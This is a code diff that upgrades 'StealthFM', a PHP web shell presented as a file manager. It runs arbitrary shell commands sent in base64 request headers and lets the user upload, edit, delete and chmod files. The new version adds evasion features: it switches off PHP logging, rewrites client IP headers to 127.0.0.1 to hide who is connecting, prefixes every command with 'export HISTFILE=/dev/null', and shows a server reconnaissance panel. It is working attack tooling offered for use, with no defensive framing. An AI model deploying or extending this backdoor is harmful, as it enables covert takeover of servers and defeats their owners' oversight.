@@ -1,10 +1,33 @@
 <?php
 // -------------------------------------------------------------------------
-// SERVER SIDE (LOGIC V22 - UNTOUCHED & FAST)
+// STEALTH FM V41 (MADE WITH LOVE + GHOST PROTOCOL)
 // -------------------------------------------------------------------------
-ini_set('display_errors', 0);
-ini_set('log_errors', 1);
-@set_time_limit(0); 
+
+// 1. STEALTH MODE: DISABLE PHP LOGS
+error_reporting(0);
+@ini_set('display_errors', 0);
+@ini_set('log_errors', 0);
+@ini_set('error_log', NULL);
+@set_time_limit(0);
+
+// 2. IP CLOAKING / ANTI-LOGGING HEADERS
+function cloak_headers() {
+    $fake_ip = "127.0.0.1"; 
+    $headers = [
+        'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 
+        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'
+    ];
+    foreach ($headers as $key) {
+        if (isset($_SERVER[$key])) $_SERVER[$key] = $fake_ip;
+        putenv("$key=$fake_ip");
+    }
+    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+    header("Pragma: no-cache");
+    header("Expires: Wed, 11 Jan 1984 05:00:00 GMT");
+}
+cloak_headers();
+
+if (isset($_GET['do_phpinfo'])) { phpinfo(); exit; }
 
 $h_act  = 'HTTP_X_ACTION';
 $h_path = 'HTTP_X_PATH';
@@ -14,6 +37,24 @@ $h_tool = 'HTTP_X_TOOL';
 $h_step = 'HTTP_X_STEP'; 
 
 $root = realpath(__DIR__); 
+
+function get_sys_info() {
+    $u_id = function_exists('posix_getpwuid') ? posix_getpwuid(getmyuid()) : ['name' => get_current_user(), 'gid' => getmygid()];
+    $curl_v = function_exists('curl_version') ? curl_version()['version'] : 'N/A';
+    $safe_mode = (ini_get('safe_mode') == 1 || strtolower(ini_get('safe_mode')) == 'on') ? "<span style='color:#f28b82'>ON</span>" : "<span style='color:#81c995'>Off</span>";
+    return [
+        'os' => php_uname(),
+        'user' => getmyuid() . ' (' . $u_id['name'] . ')',
+        'group' => getmygid() . ' (' . $u_id['gid'] . ')',
+        'safe' => $safe_mode,
+        'ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']),
+        'soft' => $_SERVER['SERVER_SOFTWARE'],
+        'php' => phpversion(),
+        'curl' => $curl_v,
+        'time' => date('Y-m-d H:i:s')
+    ];
+}
+$sys = get_sys_info();
 
 function x_read($path) {
     if (is_readable($path)) return @file_get_contents($path);
@@ -94,7 +135,10 @@ if (isset($_SERVER[$h_act])) {
     if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
     
     if ($action === 'cmd') {
-        $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; $cmd .= " 2>&1"; $out = ""; 
+        $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; 
+        // STEALTH: Prevent History
+        $cmd = "export HISTFILE=/dev/null; " . $cmd . " 2>&1"; 
+        $out = ""; 
         if(function_exists('shell_exec')) { $out = @shell_exec($cmd); }
         elseif(function_exists('passthru')) { ob_start(); @passthru($cmd); $out = ob_get_clean(); }
         elseif(function_exists('exec')) { $a=[]; @exec($cmd,$a); $out = implode("\n",$a); }
@@ -191,14 +235,14 @@ if (isset($_SERVER[$h_act])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <title>StealthFM v26 Turbo</title>
+    <title>StealthFM v41</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     
     <style>
-        /* TURBO TRANSITIONS (0.1s) */
+        /* TURBO TRANSITIONS */
         * { transition: border-color 0.1s ease, background-color 0.1s ease, color 0.1s ease, box-shadow 0.1s ease; }
 
         :root {
@@ -214,9 +258,24 @@ if (isset($_SERVER[$h_act])) {
         .navbar-brand { font-weight: 700; color: #fff !important; font-size: 1.1rem; }
         .path-wrapper { margin-top: 80px; margin-bottom: 20px; }
         
+        /* ANIMATED GHOST */
+        .fa-ghost { animation: float 3s ease-in-out infinite; }
+        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-5px); } 100% { transform: translateY(0px); } }
+
+        .sys-info-box {
+            background: #18191a; border: 1px solid var(--border-color); border-radius: 12px;
+            padding: 15px; margin-bottom: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #ccc;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .sys-row { margin-bottom: 5px; word-break: break-all; }
+        .sys-val { color: var(--accent-primary); }
+        .sys-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 5px; margin-top: 5px; }
+        .php-link { color: var(--accent-warning); text-decoration: none; font-weight: bold; margin-left: 5px; }
+        .php-link:hover { text-decoration: underline; color: #fff; }
+
         #terminal-panel {
             background: #000; border: 1px solid #333; border-bottom: none; border-radius: 12px 12px 0 0;
-            overflow: hidden; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); margin-bottom: 0; animation: slideDown 0.15s ease; /* Fast Anim */
+            overflow: hidden; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); margin-bottom: 0; animation: slideDown 0.15s ease;
         }
         .term-header { background: #1a1a1a; padding: 8px 15px; border-bottom: 1px solid #333; border-top: 2px solid var(--accent-success); display: flex; justify-content: space-between; align-items: center; }
         .term-title { font-family: 'JetBrains Mono'; font-weight: 700; color: var(--accent-success); font-size: 0.8rem; }
@@ -237,10 +296,24 @@ if (isset($_SERVER[$h_act])) {
         .has-panel-above { border-top-left-radius: 0; border-top-right-radius: 0; border-top: 1px solid #333; }
         #path-txt { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 
+        /* UPLOAD STYLING */
+        .input-group { border: 1px solid #333; border-radius: 8px; overflow: hidden; }
+        #uploadInput { background: #111; color: #ccc; border: none; font-size: 0.85rem; }
+        #uploadInput::file-selector-button { background-color: #000; color: #fff; border: none; border-right: 1px solid #333; padding: 8px 12px; margin-right: 10px; font-weight: 600; transition: 0.2s; }
+        #uploadInput::file-selector-button:hover { background-color: #222; }
+        .btn-upload-modern { background: #000 !important; border: none; border-left: 1px solid #333; color: #fff !important; font-weight: 600; padding: 6px 16px; }
+        .btn-upload-modern:hover { background: #1a1a1a !important; }
+
         .btn-modern { border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-card); color: var(--text-primary); padding: 6px 12px; }
         .btn-modern:hover { background: var(--bg-hover); color: #fff; border-color: #555; }
-        .btn-upload-modern { background: var(--accent-primary); border: none; color: #000; font-weight: 700; border-radius: 8px; }
-        .btn-upload-modern:hover { background: #aecbfa; color: #000; }
+        
+        /* MATCH UP ICON SIZE */
+        .btn-icon-path { 
+            background: transparent; border: none; color: #aaa; padding: 0 10px 0 0; 
+            font-size: 1.1rem; /* Same as icon-dir */
+            cursor: pointer; transition: 0.2s; 
+        }
+        .btn-icon-path:hover { color: #fff; transform: translateY(-1px); }
 
         .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
         .table { --bs-table-bg: transparent; color: var(--text-primary); margin: 0; table-layout: fixed; width: 100%; }
@@ -249,7 +322,10 @@ if (isset($_SERVER[$h_act])) {
         .table-hover tbody tr:hover { background-color: var(--bg-hover); }
 
         .icon-dir { color: var(--accent-warning); margin-right: 10px; font-size: 1.1rem; vertical-align: middle; }
-        .icon-file { color: var(--accent-primary); margin-right: 10px; font-size: 1.1rem; vertical-align: middle; }
+        .icon-file { margin-right: 10px; font-size: 1.1rem; vertical-align: middle; } 
+        .i-php { color: #8892bf; } .i-html { color: #e34f26; } .i-css { color: #264de4; } .i-js { color: #f7df1e; } 
+        .i-img { color: #a29bfe; } .i-zip { color: #fdcb6e; } .i-code { color: #b2bec3; } .i-def { color: var(--accent-primary); } 
+
         .text-folder { color: #fff; font-weight: 600; text-decoration: none; vertical-align: middle; }
         .text-file { color: #b0b0b0; text-decoration: none; vertical-align: middle; }
         
@@ -259,6 +335,7 @@ if (isset($_SERVER[$h_act])) {
             display: inline-block; vertical-align: middle;
         }
         .writable { color: var(--accent-success); border-color: var(--accent-success); }
+        .readonly { color: var(--accent-danger); border-color: var(--accent-danger); }
         
         .action-btn { 
             width: 32px; height: 32px; border-radius: 6px; border: 1px solid transparent; background: transparent; 
@@ -269,7 +346,6 @@ if (isset($_SERVER[$h_act])) {
         .action-btn.del { color: #ef4444; background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); }
         .action-btn.del:hover { background: #ef4444; color: #fff; }
 
-        /* WIDER MODAL FOR EDITOR */
         .modal-xl { max-width: 95% !important; }
         .modal-content { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
         .modal-header { border-bottom: 1px solid var(--border-color); }
@@ -277,10 +353,7 @@ if (isset($_SERVER[$h_act])) {
         #editor-container { position: relative; width: 100%; height: 85vh; border-radius: 0 0 12px 12px; overflow: hidden; }
         
         .tools-list { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        .tool-cmd {
-            background: #111; border: 1px solid #2a2a2a; border-radius: 4px; padding: 15px 15px;
-            display: flex; align-items: center; justify-content: space-between; cursor: pointer; text-decoration: none;
-        }
+        .tool-cmd { background: #111; border: 1px solid #2a2a2a; border-radius: 4px; padding: 15px 15px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; text-decoration: none; }
         .tool-cmd:hover { background: #161616; border-color: #444; transform: translateX(2px); }
         .cmd-left { display: flex; align-items: center; gap: 12px; }
         .cmd-icon { font-size: 16px; width: 20px; text-align: center; }
@@ -296,10 +369,44 @@ if (isset($_SERVER[$h_act])) {
         .inj-status.replaced { color: var(--accent-warning); border: 1px solid var(--accent-warning); background: rgba(253, 214, 99, 0.1); }
         .inj-btn { background: var(--accent-success); color: #000; padding: 4px 12px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; border: none; }
         
+        /* TOAST */
+        #toast-container { position: fixed; top: 80px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
+        .toast-msg {
+            background: #1e1f20; color: #fff; padding: 12px 18px; border-radius: 8px;
+            border-left: 4px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            font-size: 0.9rem; min-width: 250px; opacity: 0; transform: translateX(20px);
+            animation: toastIn 0.3s forwards;
+        }
+        .toast-msg.success { border-left-color: var(--accent-success); }
+        .toast-msg.error { border-left-color: var(--accent-danger); }
+        .toast-msg.hiding { animation: toastOut 0.3s forwards; }
+        
+        /* MODERN FOOTER V40 */
+        .cyber-footer {
+            position: fixed; bottom: 0; left: 0; width: 100%;
+            background: rgba(10, 10, 10, 0.85);
+            backdrop-filter: blur(5px);
+            border-top: 1px solid #222;
+            padding: 8px 20px;
+            display: flex; justify-content: space-between; align-items: center;
+            font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: #555;
+            z-index: 9999;
+        }
+        .cyber-footer span { transition: 0.3s; }
+        .cyber-footer:hover span { color: #888; }
+        .cy-brand { color: var(--accent-primary); font-weight: 700; letter-spacing: 1px; }
+        
+        /* HEART ANIMATION */
+        .fa-heart { color: #e91e63; animation: heartbeat 1.5s infinite; }
+        @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
+        
         @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes toastIn { to { opacity: 1; transform: translateX(0); } }
+        @keyframes toastOut { to { opacity: 0; transform: translateX(20px); } }
         
         @media (max-width: 768px) { 
-            .desktop-toolbar { flex-direction: column; gap: 10px; } .upload-group { width: 100%; max-width: 100%; } .d-mobile-none { display: none; } .tools-list { grid-template-columns: 1fr; } 
+            .desktop-toolbar { flex-direction: column; gap: 10px; } .upload-group { width: 100%; max-width: 100%; } 
+            .d-mobile-none { display: none !important; } .tools-list { grid-template-columns: 1fr; } 
             .table th:first-child, .table td:first-child { padding-left: 8px !important; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
             .table th:nth-child(3), .table td:nth-child(3) { width: 65px; text-align: center; padding: 10px 2px !important; white-space: nowrap; }
             .table th:last-child, .table td:last-child { width: 90px; text-align: right; padding-right: 10px !important; white-space: nowrap; }
@@ -316,32 +423,53 @@ if (isset($_SERVER[$h_act])) {
         </a>
         <div class="d-flex gap-2">
             <button class="btn btn-modern" onclick="goHome()" title="Home"><i class="fas fa-home"></i></button>
-            <button class="btn btn-modern" onclick="loadDir('..')" title="Up"><i class="fas fa-level-up-alt"></i></button>
+            <button class="btn btn-modern" onclick="showNewFileModal()" title="New File" style="color:#fff"><i class="fas fa-file-circle-plus"></i></button>
             <button class="btn btn-modern" onclick="toggleTerm()" style="color:var(--accent-success)"><i class="fas fa-terminal"></i></button>
             <button class="btn btn-modern" onclick="openTools()" style="color:var(--accent-warning)"><i class="fas fa-skull"></i></button>
         </div>
     </div>
 </nav>
 
+<div id="toast-container"></div>
+
 <div class="container-fluid path-wrapper">
+    <div class="sys-info-box">
+        <div class="sys-row" style="color:#eee; font-weight:bold; margin-bottom:8px;">System Info: <span class="sys-val"><?php echo $sys['os']; ?></span></div>
+        <div class="sys-grid">
+            <div>User: <span class="text-success fw-bold"><?php echo $sys['user']; ?></span></div>
+            <div class="d-mobile-none">Group: <span class="text-secondary"><?php echo $sys['group']; ?></span></div>
+            <div>Safe Mode: <?php echo $sys['safe']; ?> <a href="?do_phpinfo=1" target="_blank" class="php-link">[ PHP Info ]</a></div>
+            <div>IP: <span class="text-info"><?php echo $sys['ip']; ?></span></div>
+            <div>Software: <span class="text-secondary"><?php echo $sys['soft']; ?></span></div>
+            <div>PHP Ver: <span class="text-success"><?php echo $sys['php']; ?></span></div>
+            <div class="d-mobile-none">cURL: <span class="text-secondary"><?php echo $sys['curl']; ?></span></div>
+            <div class="d-mobile-none">Time: <span class="text-warning"><?php echo $sys['time']; ?></span></div>
+        </div>
+    </div>
+
     <div id="terminal-panel" style="display:none;">
         <div class="term-header"><span class="term-title">ROOT@SHELL:~#</span><i class="fas fa-times panel-close" onclick="toggleTerm()"></i></div>
-        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v26 Turbo</div></div>
+        <div id="term-output" class="term-body-inline"><div style="color:#6a9955;"># Stealth Shell Ready. v41</div></div>
         <div class="term-input-row"><span class="term-prompt">➜</span><input type="text" id="term-cmd-inline" placeholder="Type command..." autocomplete="off"></div>
     </div>
     <div id="process-panel" style="display:none;">
         <div class="console-header"><span class="console-title"><i class="fas fa-cog fa-spin me-2"></i> SYSTEM OUTPUT</span><i class="fas fa-times panel-close" onclick="closeLog()"></i></div>
         <div id="global-log" class="p-2 bg-black text-secondary" style="height:180px; overflow-y:auto; font-family:'JetBrains Mono'; font-size:0.75rem;"></div>
     </div>
-    <div class="path-bar-custom" id="path-bar-el"><i class="fas fa-folder text-secondary me-3"></i><div id="path-txt" title="Current Path">/</div></div>
+    
+    <div class="path-bar-custom" id="path-bar-el">
+        <button class="btn-icon-path me-2" onclick="loadDir('..')" title="Up Level"><i class="fas fa-level-up-alt"></i></button>
+        <i class="fas fa-folder text-secondary me-3"></i>
+        <div id="path-txt" title="Current Path">/</div>
+    </div>
 </div>
 
 <div class="container-fluid">
     <div class="card">
         <div class="card-header bg-transparent border-bottom border-secondary border-opacity-10 py-3 desktop-toolbar d-flex justify-content-between align-items-center">
-            <div class="fw-bold text-white d-flex align-items-center"><i class="fas fa-list me-2 text-primary"></i> File Manager</div>
+            <div class="fw-bold text-white align-items-center d-none d-md-flex"><i class="fas fa-list me-2 text-primary"></i> File Manager</div>
             <div class="input-group input-group-sm upload-group" style="max-width: 400px;">
-                <input type="file" id="uploadInput" class="form-control bg-dark text-light border-secondary">
+                <input type="file" id="uploadInput" class="form-control">
                 <button class="btn btn-upload-modern" onclick="uploadFile()" id="btnUpload"><i class="fas fa-cloud-upload-alt me-1"></i> Upload</button>
             </div>
         </div>
@@ -354,6 +482,8 @@ if (isset($_SERVER[$h_act])) {
     </div>
 </div>
 
+<div class="modal fade" id="newFileModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Create New File</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><input type="text" id="new-filename" class="form-control bg-dark text-light border-secondary mb-3" placeholder="filename.php"><textarea id="new-content" class="form-control bg-dark text-light border-secondary" rows="5" placeholder="File content..."></textarea></div><div class="modal-footer"><button class="btn btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-upload-modern" onclick="submitNewFile()">Create</button></div></div></div></div>
+<div class="modal fade" id="renameModal" tabindex="-1"><div class="modal-dialog modal-dialog-centered"><div class="modal-content"><div class="modal-header"><h6 class="modal-title text-white">Rename Item</h6><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><input type="text" id="rename-input" class="form-control bg-dark text-light border-secondary"></div><div class="modal-footer"><button class="btn btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-upload-modern" onclick="submitRename()">Save</button></div></div></div></div>
 <div class="modal fade" id="editModal" tabindex="-1" data-bs-backdrop="static"><div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable"><div class="modal-content"><div class="modal-header"><h6 class="modal-title" id="editFileName"><i class="fas fa-code me-2 text-primary"></i>Editor</h6><div class="d-flex gap-2 ms-auto"><button class="btn btn-sm btn-modern" data-bs-dismiss="modal">Cancel</button><button class="btn btn-sm btn-upload-modern px-3" onclick="saveFile()" id="btnSave">Save</button></div></div><div class="modal-body p-0"><div id="editor-container"></div></div></div></div></div>
 
 <div class="modal fade" id="toolsModal" tabindex="-1">
@@ -373,11 +503,19 @@ if (isset($_SERVER[$h_act])) {
     </div>
 </div>
 
+<div class="cyber-footer">
+    <span>made with <i class="fas fa-heart"></i> <span class="cy-brand">xshikataganai</span></span>
+    <span>STATUS: <span style="color:#81c995">ACTIVE</span></span>
+</div>
+
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-    let currentPath = '', currentFile = '';
+    let currentPath = '', currentFile = '', renameTarget = '';
     var editor = null; 
-    const editModal = new bootstrap.Modal(document.getElementById('editModal')), toolsModal = new bootstrap.Modal(document.getElementById('toolsModal'));
+    const editModal = new bootstrap.Modal(document.getElementById('editModal')), 
+          toolsModal = new bootstrap.Modal(document.getElementById('toolsModal')),
+          newFileModal = new bootstrap.Modal(document.getElementById('newFileModal')),
+          renameModal = new bootstrap.Modal(document.getElementById('renameModal'));
     
     function updatePanelStyles() {
         const term = document.getElementById('terminal-panel').style.display !== 'none';
@@ -389,12 +527,36 @@ if (isset($_SERVER[$h_act])) {
     function closeLog() { document.getElementById('process-panel').style.display = 'none'; document.getElementById('global-log').innerHTML = ''; updatePanelStyles(); }
     function toggleTerm() { const p = document.getElementById('terminal-panel'); p.style.display = (p.style.display === 'none') ? 'block' : 'none'; updatePanelStyles(); if(p.style.display === 'block') setTimeout(() => document.getElementById('term-cmd-inline').focus(), 50); }
 
+    function showToast(msg, type = 'success') {
+        const container = document.getElementById('toast-container');
+        const div = document.createElement('div');
+        div.className = `toast-msg ${type}`;
+        div.innerHTML = (type === 'success' ? '<i class="fas fa-check-circle me-2 text-success"></i>' : '<i class="fas fa-times-circle me-2 text-danger"></i>') + msg;
+        container.appendChild(div);
+        setTimeout(() => { div.classList.add('hiding'); setTimeout(() => div.remove(), 300); }, 3000);
+    }
+
     async function api(action, path, method='GET', extraHeaders={}, body=null, signal=null) {
         let headers = { 'X-Action': action, 'X-Path': btoa(path), ...extraHeaders };
         return fetch(window.location.href, { method, headers, body, signal });
     }
     
     function goHome() { currentPath = '__HOME__'; loadDir('__HOME__'); }
+
+    function getFileIcon(name) {
+        let ext = name.split('.').pop().toLowerCase();
+        if(ext === name) return '<i class="fas fa-file icon-file i-def"></i>';
+        switch(ext) {
+            case 'php': return '<i class="fab fa-php icon-file i-php"></i>';
+            case 'html': case 'htm': return '<i class="fab fa-html5 icon-file i-html"></i>';
+            case 'css': return '<i class="fab fa-css3-alt icon-file i-css"></i>';
+            case 'js': case 'json': return '<i class="fab fa-js icon-file i-js"></i>';
+            case 'zip': case 'rar': case 'tar': case 'gz': case '7z': return '<i class="fas fa-file-archive icon-file i-zip"></i>';
+            case 'jpg': case 'jpeg': case 'png': case 'gif': case 'svg': case 'ico': return '<i class="fas fa-file-image icon-file i-img"></i>';
+            case 'txt': case 'log': case 'ini': case 'conf': case 'htaccess': return '<i class="fas fa-file-alt icon-file i-code"></i>';
+            default: return '<i class="fas fa-file icon-file i-def"></i>';
+        }
+    }
 
     function loadDir(path) {
         let target = currentPath;
@@ -413,13 +575,13 @@ if (isset($_SERVER[$h_act])) {
             if (!res.items.length) { tbody.innerHTML = '<tr><td colspan="5" class="text-center py-5 text-secondary fst-italic">Empty Directory</td></tr>'; return; }
             res.items.forEach(f => {
                 let isDir = f.type === 'dir'; 
-                let icon = isDir ? '<i class="fas fa-folder icon-dir"></i>' : '<i class="fas fa-file-code icon-file"></i>';
+                let icon = isDir ? '<i class="fas fa-folder icon-dir"></i>' : getFileIcon(f.name);
                 let click = isDir ? `loadDir('${f.name}')` : `openEditor('${f.name}')`; 
                 let pClass = f.write ? 'writable' : 'readonly';
                 let textClass = isDir ? 'text-folder' : 'text-file';
-                tbody.innerHTML += `<tr><td class="ps-2"><a onclick="${click}" class="${textClass} cursor-pointer d-flex align-items-center">${icon} ${f.name}</a></td><td class="d-mobile-none text-secondary"><small>${f.size}</small></td><td class="text-center"><span onclick="chmodItem('${f.name}', '${f.perm}')" class="badge-perm ${pClass} cursor-pointer">${f.perm}</span></td><td class="d-mobile-none text-secondary"><small>${f.date}</small></td><td class="text-end pe-4"><button class="action-btn edit me-1" onclick="renameItem('${f.name}')" title="Rename"><i class="fas fa-pen"></i></button><button class="action-btn del" onclick="deleteItem('${f.name}')" title="Delete"><i class="fas fa-trash"></i></button></td></tr>`;
+                tbody.innerHTML += `<tr><td class="ps-2"><a onclick="${click}" class="${textClass} cursor-pointer d-flex align-items-center">${icon} ${f.name}</a></td><td class="d-mobile-none text-secondary"><small>${f.size}</small></td><td class="text-center"><span onclick="chmodItem('${f.name}', '${f.perm}')" class="badge-perm ${pClass} cursor-pointer">${f.perm}</span></td><td class="d-mobile-none text-secondary"><small>${f.date}</small></td><td class="text-end pe-4"><button class="action-btn edit me-1" onclick="openRename('${f.name}')" title="Rename"><i class="fas fa-pen"></i></button><button class="action-btn del" onclick="deleteItem('${f.name}')" title="Delete"><i class="fas fa-trash"></i></button></td></tr>`;
             });
-        }).catch(() => alert('Network Error'));
+        }).catch(() => showToast('Network Error', 'error'));
     }
     
     function openEditor(name) { 
@@ -428,7 +590,7 @@ if (isset($_SERVER[$h_act])) {
             document.getElementById('editFileName').innerHTML = `<i class="fas fa-code me-2 text-primary"></i> ${name}`;
             if(!editor) {
                 editor = ace.edit("editor-container");
-                editor.setTheme("ace/theme/monokai"); // Dark theme
+                editor.setTheme("ace/theme/monokai"); 
                 editor.session.setMode("ace/mode/php"); 
                 editor.setShowPrintMargin(false);
                 editor.setFontSize(14);
@@ -443,11 +605,76 @@ if (isset($_SERVER[$h_act])) {
         }); 
     }
 
-    function saveFile() { let btn=document.getElementById('btnSave'); let old=btn.innerHTML; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>'; let content = editor.getValue(); api('save', currentFile, 'PUT', {}, content).then(r => r.text()).then(m => { alert(m); editModal.hide(); btn.innerHTML=old; }); }
-    function uploadFile() { let input=document.getElementById('uploadInput'); if(!input.files.length) return; let btn=document.getElementById('btnUpload'); let old=btn.innerHTML; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>'; let path=currentPath ? currentPath + '/' + input.files[0].name : input.files[0].name; if(currentPath === '/') path = '/' + input.files[0].name; api('upload', path, 'PUT', {}, input.files[0]).then(r => r.text()).then(m => { alert(m); input.value=''; btn.innerHTML=old; loadDir(''); }); }
-    function deleteItem(name) { if(confirm(`Del ${name}?`)) { let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; api('delete', path, 'DELETE').then(() => loadDir('')); } }
-    function renameItem(name) { let n=prompt("Name:", name); if(n && n !== name) { let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; api('rename', path, 'GET', {'X-Data': btoa(n)}).then(r => { alert(r.text()); loadDir(''); }); } }
-    function chmodItem(name, p) { let n=prompt("Chmod:", "0"+p); if(n) { let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; api('chmod', path, 'GET', {'X-Data': n}).then(() => loadDir('')); } }
+    function saveFile() { 
+        let content = editor.getValue(); 
+        api('save', currentFile, 'PUT', {}, content).then(r => r.text()).then(m => { 
+            showToast(m); editModal.hide(); 
+        }); 
+    }
+    
+    function showNewFileModal() {
+        document.getElementById('new-filename').value = '';
+        document.getElementById('new-content').value = '';
+        newFileModal.show();
+    }
+
+    function submitNewFile() {
+        let name = document.getElementById('new-filename').value;
+        let content = document.getElementById('new-content').value;
+        if (name) {
+            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name;
+            api('save', path, 'PUT', {}, content).then(r => r.text()).then(m => { 
+                showToast("Created: " + name); 
+                newFileModal.hide();
+                loadDir(''); 
+            });
+        }
+    }
+
+    function uploadFile() { 
+        let input=document.getElementById('uploadInput'); 
+        if(!input.files.length) { showToast("Select a file first", "error"); return; }
+        let btn=document.getElementById('btnUpload'); let old=btn.innerHTML; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>'; 
+        let path=currentPath ? currentPath + '/' + input.files[0].name : input.files[0].name; 
+        if(currentPath === '/') path = '/' + input.files[0].name; 
+        api('upload', path, 'PUT', {}, input.files[0]).then(r => r.text()).then(m => { 
+            showToast(m); input.value=''; btn.innerHTML=old; loadDir(''); 
+        }); 
+    }
+
+    function deleteItem(name) { 
+        if(confirm(`Del ${name}?`)) { 
+            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
+            api('delete', path, 'DELETE').then(() => { showToast("Deleted: " + name); loadDir(''); }); 
+        } 
+    }
+    
+    function openRename(name) {
+        renameTarget = name;
+        document.getElementById('rename-input').value = name;
+        renameModal.show();
+    }
+
+    function submitRename() {
+        let newName = document.getElementById('rename-input').value;
+        if (newName && newName !== renameTarget) {
+            let path = (currentPath === '/') ? '/' + renameTarget : currentPath + '/' + renameTarget; 
+            api('rename', path, 'GET', {'X-Data': btoa(newName)}).then(r => { 
+                showToast(r.text()); 
+                renameModal.hide();
+                loadDir(''); 
+            });
+        }
+    }
+    
+    function chmodItem(name, p) { 
+        let n=prompt("Chmod:", "0"+p); 
+        if(n) { 
+            let path = (currentPath === '/') ? '/' + name : currentPath + '/' + name; 
+            api('chmod', path, 'GET', {'X-Data': n}).then(() => { showToast("Chmod Updated"); loadDir(''); }); 
+        } 
+    }
+    
     function openTools() { toolsModal.show(); }
     
     document.getElementById('term-cmd-inline').addEventListener('keypress', function (e) {
